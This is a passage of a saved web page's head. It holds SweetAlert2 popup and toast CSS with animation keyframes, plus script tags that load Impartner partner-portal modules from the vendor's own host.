      .swal2-progresssteps .swal2-progresscircle.swal2-activeprogressstep ~ .swal2-progresscircle {
        background: #add8e6; }
      .swal2-progresssteps .swal2-progresscircle.swal2-activeprogressstep ~ .swal2-progressline {
        background: #add8e6; }
  .swal2-progresssteps .swal2-progressline {
    width: 2.5em;
    height: .4em;
    margin: 0 -1px;
    background: #3085d6;
    z-index: 10; }

[class^='swal2'] {
  -webkit-tap-highlight-color: transparent; }

.swal2-show {
  -webkit-animation: swal2-show 0.3s;
          animation: swal2-show 0.3s; }
  .swal2-show.swal2-noanimation {
    -webkit-animation: none;
            animation: none; }

.swal2-hide {
  -webkit-animation: swal2-hide 0.15s forwards;
          animation: swal2-hide 0.15s forwards; }
  .swal2-hide.swal2-noanimation {
    -webkit-animation: none;
            animation: none; }

[dir='rtl'] .swal2-close {
  right: auto;
  left: 0; }

.swal2-animate-success-icon .swal2-success-line-tip {
  -webkit-animation: swal2-animate-success-line-tip 0.75s;
          animation: swal2-animate-success-line-tip 0.75s; }

.swal2-animate-success-icon .swal2-success-line-long {
  -webkit-animation: swal2-animate-success-line-long 0.75s;
          animation: swal2-animate-success-line-long 0.75s; }

.swal2-animate-success-icon .swal2-success-circular-line-right {
  -webkit-animation: swal2-rotate-success-circular-line 4.25s ease-in;
          animation: swal2-rotate-success-circular-line 4.25s ease-in; }

.swal2-animate-error-icon {
  -webkit-animation: swal2-animate-error-icon 0.5s;
          animation: swal2-animate-error-icon 0.5s; }
  .swal2-animate-error-icon .swal2-x-mark {
    -webkit-animation: swal2-animate-error-x-mark 0.5s;
            animation: swal2-animate-error-x-mark 0.5s; }

@-webkit-keyframes swal2-rotate-loading {
  0% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg); }
  100% {
    -webkit-transform: rotate(360deg);
            transform: rotate(360deg); } }

@keyframes swal2-rotate-loading {
  0% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg); }
  100% {
    -webkit-transform: rotate(360deg);
            transform: rotate(360deg); } }</style><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm" src="https://prod.impartner.live/scripts/prm.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="@impartner/shared-components" src="https://prod.impartner.live/scripts/../dist/@impartner/shared-components/shared-components.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/handler" src="https://prod.impartner.live/scripts/prm/handler.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/query" src="https://prod.impartner.live/scripts/prm/query.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/service" src="https://prod.impartner.live/scripts/prm/service.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/safe-widget-define" src="https://prod.impartner.live/scripts/prm/safe-widget-define.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/cmspage" src="https://prod.impartner.live/scripts/prm/cmspage.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/components/nav" src="https://prod.impartner.live/scripts/prm/components/nav.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="@impartner/web-widgets/vendor" src="https://prod.impartner.live/scripts/../dist/@impartner/web-widgets/vendor.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/alert" src="https://prod.impartner.live/scripts/prm/alert.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="stringify" src="https://prod.impartner.live/scripts/../jscript/stringformat-1.12.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/services/objects" src="https://prod.impartner.live/scripts/prm/services/objects.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/page" src="https://prod.impartner.live/scripts/prm/page.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><style>/* You can add global styles to this file, and also import other style files */
@tailwind base;
@tailwind components;
@tailwind utilities;</style><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/component" src="https://prod.impartner.live/scripts/prm/component.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="sweetalert2" src="https://prod.impartner.live/scripts/lib/sweetalert2.min.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="@impartner/web-widgets" src="https://prod.impartner.live/scripts/../dist/@impartner/web-widgets/web-widgets.min.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><style>@-webkit-keyframes swal2-show {
  0% {
    -webkit-transform: scale(0.7);
            transform: scale(0.7); }
  45% {
    -webkit-transform: scale(1.05);
            transform: scale(1.05); }
  80% {
    -webkit-transform: scale(0.95);
            transform: scale(0.95); }
  100% {
    -webkit-transform: scale(1);
            transform: scale(1); } }

@keyframes swal2-show {
  0% {
    -webkit-transform: scale(0.7);
            transform: scale(0.7); }
  45% {
    -webkit-transform: scale(1.05);
            transform: scale(1.05); }
  80% {
    -webkit-transform: scale(0.95);
            transform: scale(0.95); }
  100% {
    -webkit-transform: scale(1);
            transform: scale(1); } }

@-webkit-keyframes swal2-hide {
  0% {
    -webkit-transform: scale(1);
            transform: scale(1);
    opacity: 1; }
  100% {
    -webkit-transform: scale(0.5);
            transform: scale(0.5);
    opacity: 0; } }

@keyframes swal2-hide {
  0% {
    -webkit-transform: scale(1);
            transform: scale(1);
    opacity: 1; }
  100% {
    -webkit-transform: scale(0.5);
            transform: scale(0.5);
    opacity: 0; } }

@-webkit-keyframes swal2-animate-success-line-tip {
  0% {
    top: 1.1875em;
    left: .0625em;
    width: 0; }
  54% {
    top: 1.0625em;
    left: .125em;
    width: 0; }
  70% {
    top: 2.1875em;
    left: -.375em;
    width: 3.125em; }
  84% {
    top: 3em;
    left: 1.3125em;
    width: 1.0625em; }
  100% {
    top: 2.8125em;
    left: .875em;
    width: 1.5625em; } }

@keyframes swal2-animate-success-line-tip {
  0% {
    top: 1.1875em;
    left: .0625em;
    width: 0; }
  54% {
    top: 1.0625em;
    left: .125em;
    width: 0; }
  70% {
    top: 2.1875em;
    left: -.375em;
    width: 3.125em; }
  84% {
    top: 3em;
    left: 1.3125em;
    width: 1.0625em; }
  100% {
    top: 2.8125em;
    left: .875em;
    width: 1.5625em; } }

@-webkit-keyframes swal2-animate-success-line-long {
  0% {
    top: 3.375em;
    right: 2.875em;
    width: 0; }
  65% {
    top: 3.375em;
    right: 2.875em;
    width: 0; }
  84% {
    top: 2.1875em;
    right: 0;
    width: 3.4375em; }
  100% {
    top: 2.375em;
    right: .5em;
    width: 2.9375em; } }

@keyframes swal2-animate-success-line-long {
  0% {
    top: 3.375em;
    right: 2.875em;
    width: 0; }
  65% {
    top: 3.375em;
    right: 2.875em;
    width: 0; }
  84% {
    top: 2.1875em;
    right: 0;
    width: 3.4375em; }
  100% {
    top: 2.375em;
    right: .5em;
    width: 2.9375em; } }

@-webkit-keyframes swal2-rotate-success-circular-line {
  0% {
    -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg); }
  5% {
    -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg); }
  12% {
    -webkit-transform: rotate(-405deg);
            transform: rotate(-405deg); }
  100% {
    -webkit-transform: rotate(-405deg);
            transform: rotate(-405deg); } }

@keyframes swal2-rotate-success-circular-line {
  0% {
    -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg); }
  5% {
    -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg); }
  12% {
    -webkit-transform: rotate(-405deg);
            transform: rotate(-405deg); }
  100% {
    -webkit-transform: rotate(-405deg);
            transform: rotate(-405deg); } }

@-webkit-keyframes swal2-animate-error-x-mark {
  0% {
    margin-top: 1.625em;
    -webkit-transform: scale(0.4);
            transform: scale(0.4);
    opacity: 0; }
  50% {
    margin-top: 1.625em;
    -webkit-transform: scale(0.4);
            transform: scale(0.4);
    opacity: 0; }
  80% {
    margin-top: -.375em;
    -webkit-transform: scale(1.15);
            transform: scale(1.15); }
  100% {
    margin-top: 0;
    -webkit-transform: scale(1);
            transform: scale(1);
    opacity: 1; } }

@keyframes swal2-animate-error-x-mark {
  0% {
    margin-top: 1.625em;
    -webkit-transform: scale(0.4);
            transform: scale(0.4);
    opacity: 0; }
  50% {
    margin-top: 1.625em;
    -webkit-transform: scale(0.4);
            transform: scale(0.4);
    opacity: 0; }
  80% {
    margin-top: -.375em;
    -webkit-transform: scale(1.15);
            transform: scale(1.15); }
  100% {
    margin-top: 0;
    -webkit-transform: scale(1);
            transform: scale(1);
    opacity: 1; } }

@-webkit-keyframes swal2-animate-error-icon {
  0% {
    -webkit-transform: rotateX(100deg);
            transform: rotateX(100deg);
    opacity: 0; }
  100% {
    -webkit-transform: rotateX(0deg);
            transform: rotateX(0deg);
    opacity: 1; } }

@keyframes swal2-animate-error-icon {
  0% {
    -webkit-transform: rotateX(100deg);
            transform: rotateX(100deg);
    opacity: 0; }
  100% {
    -webkit-transform: rotateX(0deg);
            transform: rotateX(0deg);
    opacity: 1; } }

body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast {
  flex-direction: column;
  align-items: stretch; }
  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-actions {
    flex: 1;
    align-self: stretch;
    justify-content: flex-end;
    height: 2.2em; }
  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-loading {
    justify-content: center; }
  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-input {
    height: 2em;
    margin: .3125em auto;
    font-size: 1em; }
  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-validationerror {
    font-size: 1em; }

body.swal2-toast-shown > .swal2-container {
  position: fixed;
  background-color: transparent; }
  body.swal2-toast-shown > .swal2-container.swal2-shown {
    background-color: transparent; }
  body.swal2-toast-shown > .swal2-container.swal2-top {
    top: 0;
    right: auto;
    bottom: auto;
    left: 50%;
    -webkit-transform: translateX(-50%);
            transform: translateX(-50%); }
  body.swal2-toast-shown > .swal2-container.swal2-top-end, body.swal2-toast-shown > .swal2-container.swal2-top-right {
    top: 0;
    right: 0;
    bottom: auto;
    left: auto; }
  body.swal2-toast-shown > .swal2-container.swal2-top-start, body.swal2-toast-shown > .swal2-container.swal2-top-left {
    top: 0;
    right: auto;
    bottom: auto;
    left: 0; }
  body.swal2-toast-shown > .swal2-container.swal2-center-start, body.swal2-toast-shown > .swal2-container.swal2-center-left {
    top: 50%;
    right: auto;
    bottom: auto;
    left: 0;
    -webkit-transform: translateY(-50%);
            transform: translateY(-50%); }
  body.swal2-toast-shown > .swal2-container.swal2-center {
    top: 50%;
    right: auto;
    bottom: auto;
    left: 50%;
    -webkit-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%); }
  body.swal2-toast-shown > .swal2-container.swal2-center-end, body.swal2-toast-shown > .swal2-container.swal2-center-right {
    top: 50%;
    right: 0;
    bottom: auto;
    left: auto;
    -webkit-transform: translateY(-50%);
            transform: translateY(-50%); }
  body.swal2-toast-shown > .swal2-container.swal2-bottom-start, body.swal2-toast-shown > .swal2-container.swal2-bottom-left {
    top: auto;
    right: auto;
    bottom: 0;
    left: 0; }
  body.swal2-toast-shown > .swal2-container.swal2-bottom {
    top: auto;
    right: auto;
    bottom: 0;
    left: 50%;
    -webkit-transform: translateX(-50%);
            transform: translateX(-50%); }
  body.swal2-toast-shown > .swal2-container.swal2-bottom-end, body.swal2-toast-shown > .swal2-container.swal2-bottom-right {
    top: auto;
    right: 0;
    bottom: 0;
    left: auto; }

.swal2-popup.swal2-toast {
  flex-direction: row;
  align-items: center;
  width: auto;
  padding: 0.625em;
  box-shadow: 0 0 0.625em #d9d9d9;
  overflow-y: hidden; }
  .swal2-popup.swal2-toast .swal2-header {
    flex-direction: row; }
  .swal2-popup.swal2-toast .swal2-title {
    justify-content: flex-start;
    margin: 0 .6em;
    font-size: 1em; }
  .swal2-popup.swal2-toast .swal2-close {
    position: initial; }
  .swal2-popup.swal2-toast .swal2-content {
    justify-content: flex-start;
    font-size: 1em; }
  .swal2-popup.swal2-toast .swal2-icon {
    width: 2em;
    min-width: 2em;
    height: 2em;
    margin: 0; }
    .swal2-popup.swal2-toast .swal2-icon-text {
      font-size: 2em;
      font-weight: bold;
      line-height: 1em; }
    .swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring {
      width: 2em;
      height: 2em; }
    .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^='swal2-x-mark-line'] {
      top: .875em;
      width: 1.375em; }
      .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='left'] {
        left: .3125em; }
      .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='right'] {
        right: .3125em; }
  .swal2-popup.swal2-toast .swal2-actions {
    height: auto;
    margin: 0 .3125em; }
  .swal2-popup.swal2-toast .swal2-styled {
    margin: 0 .3125em;
    padding: .3125em .625em;
    font-size: 1em; }
    .swal2-popup.swal2-toast .swal2-styled:focus {
      box-shadow: 0 0 0 0.0625em #fff, 0 0 0 0.125em rgba(50, 100, 150, 0.4); }
  .swal2-popup.swal2-toast .swal2-success {
    border-color: #a5dc86; }
    .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-circular-line'] {
      position: absolute;
      width: 2em;
      height: 2.8125em;
      -webkit-transform: rotate(45deg);
              transform: rotate(45deg);
      border-radius: 50%; }
      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-circular-line'][class$='left'] {
        top: -.25em;
        left: -.9375em;
        -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg);
        -webkit-transform-origin: 2em 2em;
                transform-origin: 2em 2em;
        border-radius: 4em 0 0 4em; }
      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-circular-line'][class$='right'] {
        top: -.25em;
        left: .9375em;
        -webkit-transform-origin: 0 2em;
                transform-origin: 0 2em;
        border-radius: 0 4em 4em 0; }
    .swal2-popup.swal2-toast .swal2-success .swal2-success-ring {
      width: 2em;
      height: 2em; }
    .swal2-popup.swal2-toast .swal2-success .swal2-success-fix {
      top: 0;
      left: .4375em;
      width: .4375em;
      height: 2.6875em; }
    .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-line'] {
      height: .3125em; }
      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-line'][class$='tip'] {
        top: 1.125em;
        left: .1875em;
        width: .75em; }
      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-line'][class$='long'] {
        top: .9375em;
        right: .1875em;
        width: 1.375em; }
  .swal2-popup.swal2-toast.swal2-show {
    -webkit-animation: showSweetToast .5s;
            animation: showSweetToast .5s; }
  .swal2-popup.swal2-toast.swal2-hide {
    -webkit-animation: hideSweetToast .2s forwards;
            animation: hideSweetToast .2s forwards; }
  .swal2-popup.swal2-toast .swal2-animate-success-icon .swal2-success-line-tip {
    -webkit-animation: animate-toast-success-tip .75s;
            animation: animate-toast-success-tip .75s; }
  .swal2-popup.swal2-toast .swal2-animate-success-icon .swal2-success-line-long {
    -webkit-animation: animate-toast-success-long .75s;
            animation: animate-toast-success-long .75s; }

@-webkit-keyframes showSweetToast {
  0% {
    -webkit-transform: translateY(-0.625em) rotateZ(2deg);
            transform: translateY(-0.625em) rotateZ(2deg);
    opacity: 0; }
  33% {
    -webkit-transform: translateY(0) rotateZ(-2deg);
            transform: translateY(0) rotateZ(-2deg);
    opacity: .5; }
  66% {
    -webkit-transform: translateY(0.3125em) rotateZ(2deg);
            transform: translateY(0.3125em) rotateZ(2deg);
    opacity: .7; }
  100% {
    -webkit-transform: translateY(0) rotateZ(0);
            transform: translateY(0) rotateZ(0);
    opacity: 1; } }

@keyframes showSweetToast {
  0% {
    -webkit-transform: translateY(-0.625em) rotateZ(2deg);
            transform: translateY(-0.625em) rotateZ(2deg);
    opacity: 0; }
  33% {
    -webkit-transform: translateY(0) rotateZ(-2deg);
            transform: translateY(0) rotateZ(-2deg);
    opacity: .5; }
  66% {
    -webkit-transform: translateY(0.3125em) rotateZ(2deg);
            transform: translateY(0.3125em) rotateZ(2deg);
    opacity: .7; }
  100% {
    -webkit-transform: translateY(0) rotateZ(0);
            transform: translateY(0) rotateZ(0);
    opacity: 1; } }

@-webkit-keyframes hideSweetToast {
  0% {
    opacity: 1; }
  33% {
    opacity: .5; }
  100% {
    -webkit-transform: rotateZ(1deg);
            transform: rotateZ(1deg);
    opacity: 0; } }

@keyframes hideSweetToast {
  0% {
    opacity: 1; }
  33% {
    opacity: .5; }
  100% {
    -webkit-transform: rotateZ(1deg);
            transform: rotateZ(1deg);
    opacity: 0; } }

@-webkit-keyframes animate-toast-success-tip {
  0% {
    top: .5625em;
    left: .0625em;
    width: 0; }
  54% {
    top: .125em;
    left: .125em;
    width: 0; }
  70% {
    top: .625em;
    left: -.25em;
    width: 1.625em; }
  84% {
    top: 1.0625em;
    left: .75em;
    width: .5em; }
  100% {
    top: 1.125em;
    left: .1875em;
    width: .75em; } }

@keyframes animate-toast-success-tip {
  0% {
    top: .5625em;
    left: .0625em;
    width: 0; }
  54% {
    top: .125em;
    left: .125em;
    width: 0; }
  70% {
    top: .625em;
    left: -.25em;
    width: 1.625em; }
  84% {
    top: 1.0625em;
    left: .75em;
    width: .5em; }
  100% {
    top: 1.125em;
    left: .1875em;
    width: .75em; } }

@-webkit-keyframes animate-toast-success-long {
  0% {
    top: 1.625em;
    right: 1.375em;
    width: 0; }
  65% {
    top: 1.25em;
    right: .9375em;
    width: 0; }
  84% {
    top: .9375em;
    right: 0;
    width: 1.125em; }
  100% {
    top: .9375em;
    right: .1875em;
    width: 1.375em; } }

@keyframes animate-toast-success-long {
  0% {
    top: 1.625em;
    right: 1.375em;
    width: 0; }
  65% {
    top: 1.25em;
    right: .9375em;
    width: 0; }
  84% {
    top: .9375em;
    right: 0;
    width: 1.125em; }
  100% {
    top: .9375em;
    right: .1875em;
    width: 1.375em; } }

html.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown),
body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) {
  height: auto;
  overflow-y: hidden; }

body.swal2-no-backdrop .swal2-shown {
  top: auto;
  right: auto;
  bottom: auto;
  left: auto;
  background-color: transparent; }
  body.swal2-no-backdrop .swal2-shown > .swal2-modal {
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.4); }
  body.swal2-no-backdrop .swal2-shown.swal2-top {
    top: 0;
    left: 50%;
    -webkit-transform: translateX(-50%);
            transform: translateX(-50%); }
  body.swal2-no-backdrop .swal2-shown.swal2-top-start, body.swal2-no-backdrop .swal2-shown.swal2-top-left {
    top: 0;
    left: 0; }
  body.swal2-no-backdrop .swal2-shown.swal2-top-end, body.swal2-no-backdrop .swal2-shown.swal2-top-right {
    top: 0;
    right: 0; }
  body.swal2-no-backdrop .swal2-shown.swal2-center {
    top: 50%;
    left: 50%;
    -webkit-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%); }
  body.swal2-no-backdrop .swal2-shown.swal2-center-start, body.swal2-no-backdrop .swal2-shown.swal2-center-left {
    top: 50%;
    left: 0;
    -webkit-transform: translateY(-50%);
            transform: translateY(-50%); }
  body.swal2-no-backdrop .swal2-shown.swal2-center-end, body.swal2-no-backdrop .swal2-shown.swal2-center-right {
    top: 50%;
    right: 0;
    -webkit-transform: translateY(-50%);
            transform: translateY(-50%); }
  body.swal2-no-backdrop .swal2-shown.swal2-bottom {
    bottom: 0;
    left: 50%;
    -webkit-transform: translateX(-50%);
            transform: translateX(-50%); }
  body.swal2-no-backdrop .swal2-shown.swal2-bottom-start, body.swal2-no-backdrop .swal2-shown.swal2-bottom-left {
    bottom: 0;
    left: 0; }
  body.swal2-no-backdrop .swal2-shown.swal2-bottom-end, body.swal2-no-backdrop .swal2-shown.swal2-bottom-right {
    right: 0;
    bottom: 0; }

.swal2-container {
  display: flex;
  position: fixed;
  top: 0;
  right: 0;
  bottom: 0;
  left: 0;
  flex-direction: row;
  align-items: center;
  justify-content: center;
  padding: 10px;
  background-color: transparent;
  z-index: 1060;
  overflow-x: hidden;
  -webkit-overflow-scrolling: touch; }
  .swal2-container.swal2-top {
    align-items: flex-start; }
  .swal2-container.swal2-top-start, .swal2-container.swal2-top-left {
    align-items: flex-start;
    justify-content: flex-start; }
  .swal2-container.swal2-top-end, .swal2-container.swal2-top-right {
    align-items: flex-start;
    justify-content: flex-end; }
  .swal2-container.swal2-center {
    align-items: center; }
  .swal2-container.swal2-center-start, .swal2-container.swal2-center-left {
    align-items: center;
    justify-content: flex-start; }
  .swal2-container.swal2-center-end, .swal2-container.swal2-center-right {
    align-items: center;
    justify-content: flex-end; }
  .swal2-container.swal2-bottom {
    align-items: flex-end; }
  .swal2-container.swal2-bottom-start, .swal2-container.swal2-bottom-left {
    align-items: flex-end;
    justify-content: flex-start; }
  .swal2-container.swal2-bottom-end, .swal2-container.swal2-bottom-right {
    align-items: flex-end;
    justify-content: flex-end; }
  .swal2-container.swal2-grow-fullscreen > .swal2-modal {
    display: flex !important;
    flex: 1;
    align-self: stretch;
    justify-content: center; }
  .swal2-container.swal2-grow-row > .swal2-modal {
    display: flex !important;
    flex: 1;
    align-content: center;
    justify-content: center; }
  .swal2-container.swal2-grow-column {
    flex: 1;
    flex-direction: column; }
    .swal2-container.swal2-grow-column.swal2-top, .swal2-container.swal2-grow-column.swal2-center, .swal2-container.swal2-grow-column.swal2-bottom {
      align-items: center; }
    .swal2-container.swal2-grow-column.swal2-top-start, .swal2-container.swal2-grow-column.swal2-center-start, .swal2-container.swal2-grow-column.swal2-bottom-start, .swal2-container.swal2-grow-column.swal2-top-left, .swal2-container.swal2-grow-column.swal2-center-left, .swal2-container.swal2-grow-column.swal2-bottom-left {
      align-items: flex-start; }
    .swal2-container.swal2-grow-column.swal2-top-end, .swal2-container.swal2-grow-column.swal2-center-end, .swal2-container.swal2-grow-column.swal2-bottom-end, .swal2-container.swal2-grow-column.swal2-top-right, .swal2-container.swal2-grow-column.swal2-center-right, .swal2-container.swal2-grow-column.swal2-bottom-right {
      align-items: flex-end; }
    .swal2-container.swal2-grow-column > .swal2-modal {
      display: flex !important;
      flex: 1;
      align-content: center;
      justify-content: center; }
  .swal2-container:not(.swal2-top):not(.swal2-top-start):not(.swal2-top-end):not(.swal2-top-left):not(.swal2-top-right):not(.swal2-center-start):not(.swal2-center-end):not(.swal2-center-left):not(.swal2-center-right):not(.swal2-bottom):not(.swal2-bottom-start):not(.swal2-bottom-end):not(.swal2-bottom-left):not(.swal2-bottom-right) > .swal2-modal {
    margin: auto; }
  @media all and (-ms-high-contrast: none), (-ms-high-contrast: active) {
    .swal2-container .swal2-modal {
      margin: 0 !important; } }
  .swal2-container.swal2-fade {
    transition: background-color .1s; }
  .swal2-container.swal2-shown {
    background-color: rgba(0, 0, 0, 0.4); }

.swal2-popup {
  display: none;
  position: relative;
  flex-direction: column;
  justify-content: center;
  width: 32em;
  max-width: 100%;
  padding: 1.25em;
  border-radius: 0.3125em;
  background: #fff;
  font-family: inherit;
  font-size: 1rem;
  box-sizing: border-box; }
  .swal2-popup:focus {
    outline: none; }
  .swal2-popup.swal2-loading {
    overflow-y: hidden; }
  .swal2-popup .swal2-header {
    display: flex;
    flex-direction: column;
    align-items: center; }
  .swal2-popup .swal2-title {
    display: block;
    position: relative;
    max-width: 100%;
    margin: 0 0 0.4em;
    padding: 0;
    color: #595959;
    font-size: 1.875em;
    font-weight: 600;
    text-align: center;
    text-transform: none;
    word-wrap: break-word; }
  .swal2-popup .swal2-actions {
    align-items: center;
    justify-content: center;
    margin: 1.25em auto 0; }
    .swal2-popup .swal2-actions:not(.swal2-loading) .swal2-styled[disabled] {
      opacity: .4; }
    .swal2-popup .swal2-actions:not(.swal2-loading) .swal2-styled:hover {
      background-image: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1)); }
    .swal2-popup .swal2-actions:not(.swal2-loading) .swal2-styled:active {
      background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)); }
    .swal2-popup .swal2-actions.swal2-loading .swal2-styled.swal2-confirm {
      width: 2.5em;
      height: 2.5em;
      margin: .46875em;
      padding: 0;
      border: .25em solid transparent;
      border-radius: 100%;
      border-color: transparent;
      background-color: transparent !important;
      color: transparent;
      cursor: default;
      box-sizing: border-box;
      -webkit-animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
              animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
      -webkit-user-select: none;
         -moz-user-select: none;
          -ms-user-select: none;
              user-select: none; }
    .swal2-popup .swal2-actions.swal2-loading .swal2-styled.swal2-cancel {
      margin-right: 30px;
      margin-left: 30px; }
    .swal2-popup .swal2-actions.swal2-loading :not(.swal2-styled).swal2-confirm::after {
      display: inline-block;
      width: 15px;
      height: 15px;
      margin-left: 5px;
      border: 3px solid #999999;
      border-radius: 50%;
      border-right-color: transparent;
      box-shadow: 1px 1px 1px #fff;
      content: '';
      -webkit-animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
              animation: swal2-rotate-loading 1.5s linear 0s infinite normal; }
  .swal2-popup .swal2-styled {
    margin: 0 .3125em;
    padding: .625em 2em;
    font-weight: 500;
    box-shadow: none; }
    .swal2-popup .swal2-styled:not([disabled]) {
      cursor: pointer; }
    .swal2-popup .swal2-styled.swal2-confirm {
      border: 0;
      border-radius: 0.25em;
      background-color: #3085d6;
      color: #fff;
      font-size: 1.0625em; }
    .swal2-popup .swal2-styled.swal2-cancel {
      border: 0;
      border-radius: 0.25em;
      background-color: #aaa;
      color: #fff;
      font-size: 1.0625em; }
    .swal2-popup .swal2-styled:focus {
      outline: none;
      box-shadow: 0 0 0 2px #fff, 0 0 0 4px rgba(50, 100, 150, 0.4); }
    .swal2-popup .swal2-styled::-moz-focus-inner {
      border: 0; }
  .swal2-popup .swal2-footer {
    justify-content: center;
    margin: 1.25em 0 0;
    padding-top: 1em;
    border-top: 1px solid #eee;
    color: #545454;
    font-size: 1em; }
  .swal2-popup .swal2-image {
    max-width: 100%;
    margin: 1.25em auto; }
  .swal2-popup .swal2-close {
    position: absolute;
    top: 0;
    right: 0;
    justify-content: center;
    width: 1.2em;
    min-width: 1.2em;
    height: 1.2em;
    margin: 0;
    padding: 0;
    transition: color 0.1s ease-out;
    border: none;
    border-radius: 0;
    background: transparent;
    color: #cccccc;
    font-family: serif;
    font-size: calc(2.5em - 0.25em);
    line-height: 1.2em;
    cursor: pointer; }
    .swal2-popup .swal2-close:hover {
      -webkit-transform: none;
              transform: none;
      color: #f27474; }
  .swal2-popup > .swal2-input,
  .swal2-popup > .swal2-file,
  .swal2-popup > .swal2-textarea,
  .swal2-popup > .swal2-select,
  .swal2-popup > .swal2-radio,
  .swal2-popup > .swal2-checkbox {
    display: none; }
  .swal2-popup .swal2-content {
    justify-content: center;
    margin: 0;
    padding: 0;
    color: #545454;
    font-size: 1.125em;
    font-weight: 300;
    line-height: normal;
    word-wrap: break-word; }
  .swal2-popup #swal2-content {
    text-align: center; }
  .swal2-popup .swal2-input,
  .swal2-popup .swal2-file,
  .swal2-popup .swal2-textarea,
  .swal2-popup .swal2-select,
  .swal2-popup .swal2-radio,
  .swal2-popup .swal2-checkbox {
    margin: 1em auto; }
  .swal2-popup .swal2-input,
  .swal2-popup .swal2-file,
  .swal2-popup .swal2-textarea {
    width: 100%;
    transition: border-color .3s, box-shadow .3s;
    border: 1px solid #d9d9d9;
    border-radius: 0.1875em;
    font-size: 1.125em;
    box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.06);
    box-sizing: border-box; }
